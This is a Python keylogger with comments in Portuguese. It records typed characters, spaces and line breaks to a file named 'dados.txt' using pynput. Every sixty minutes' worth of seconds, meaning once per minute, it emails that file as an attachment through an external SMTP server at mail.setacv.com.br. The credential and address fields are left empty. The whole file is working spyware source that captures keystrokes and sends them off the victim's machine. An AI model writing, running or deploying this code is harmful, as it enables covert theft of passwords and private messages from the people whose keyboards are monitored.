from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import time

output_file = "dados.txt"

# Função para lidar com as teclas pressionadas
def on_press(key):
    try:
        # Escreve a tecla pressionada no arquivo se for alfanumérica ou espaço
        if key.char.isalnum() or key.char.isspace():
            with open(output_file, "a", encoding="utf-8") as file:
                file.write(f"{key.char}")
    except AttributeError:
        # Se for a tecla espaço, escreve um espaço no arquivo
        if key == keyboard.Key.space:
            with open(output_file, "a", encoding="utf-8") as file:
                file.write(" ")
        # Se for a tecla Enter, escreve uma quebra de linha no arquivo
        elif key == keyboard.Key.enter:
            with open(output_file, "a", encoding="utf-8") as file:
                file.write("\n")

# Função para lidar com teclas soltas
def on_release(key):
    # Sai do programa ao pressionar a tecla ESC
    if key == keyboard.Key.esc:
        return False
    
def send_mail():
    
    # Configurações do e-mail
    sender_email = ""
    receiver_email = ""
    password = ""
    subject = "Título do e-mail"
    body = "Corpo do e-mail"

    # Configurações do servidor SMTP
    smtp_server = "mail.setacv.com.br"
    smtp_port = 26

    # Criar a mensagem de e-mail
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))

    # Anexar o arquivo dados.txt
    filename = "dados.txt"
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename={filename}")
        message.attach(part)

    # Enviar o e-mail
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        print("E-mail enviado com sucesso!")
    except Exception as e:
        print(f"Erro ao enviar o e-mail: {e}")
    finally:
        server.quit()   

# Configura o listener do teclado
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

try:
    while True:
        time.sleep(60) #cronometro para chamar a função send_mail()
        # Chamar a função send_mail para enviar o e-mail
        send_mail()
except KeyboardInterrupt:
    listener.stop()



